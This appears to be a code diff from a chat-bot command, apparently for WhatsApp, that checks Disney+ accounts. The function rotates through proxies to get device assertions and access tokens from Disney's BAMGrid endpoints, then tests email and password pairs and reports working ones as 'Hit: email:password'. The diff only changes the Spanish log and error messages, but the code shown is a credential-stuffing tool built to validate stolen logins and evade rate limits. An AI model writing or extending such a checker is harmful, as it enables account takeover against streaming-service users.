@@ -55,14 +55,15 @@ const verifyDisneyCredentials = async (email, password) => {
     const deviceResponse = await makeRequestWithProxy('https://global.edge.bamgrid.com/devices', headers, deviceData, proxy);
     if (deviceResponse && deviceResponse.assertion) {
       assertion = deviceResponse.assertion;
+      console.log(`Obtención de assertion exitosa con proxy: ${proxy}`);
       break;
     } else {
-      console.error("No se pudo obtener assertion con el proxy:", proxy);
+      console.error(`Error al obtener assertion con proxy: ${proxy}`);
     }
   }
 
   if (!assertion) {
-    return 'Error al obtener assertion. Prueba con otro proxy.';
+    return 'Todas las proxies fallaron al obtener assertion. Por favor, prueba más tarde.';
   }
 
   // Intentar obtener access token con proxies
@@ -75,14 +76,15 @@ const verifyDisneyCredentials = async (email, password) => {
 
     if (tokenResponse && tokenResponse.access_token) {
       accessToken = tokenResponse.access_token;
+      console.log(`Obtención de access token exitosa con proxy: ${proxy}`);
       break;
     } else {
-      console.error("No se pudo obtener access token con el proxy:", proxy);
+      console.error(`Error al obtener access token con proxy: ${proxy}`);
     }
   }
 
   if (!accessToken) {
-    return 'Error al obtener access token. Prueba con otro proxy.';
+    return 'Todas las proxies fallaron al obtener access token. Por favor, prueba más tarde.';
   }
 
   // Intentar hacer login y verificar las credenciales
@@ -96,11 +98,11 @@ const verifyDisneyCredentials = async (email, password) => {
     if (loginResponse && loginResponse.id_token) {
       return `Hit: ${email}:${password}`;
     } else {
-      console.error("Credenciales no válidas o error en login con el proxy:", proxy);
+      console.error(`Credenciales no válidas o error en login con proxy: ${proxy}`);
     }
   }
 
-  return 'Error al verificar las credenciales. Prueba con otro proxy.';
+  return 'Todas las proxies fallaron al verificar las credenciales. Por favor, prueba más tarde.';
 };
 
 let handler = async (m, { conn, command, text, args, usedPrefix }) => {
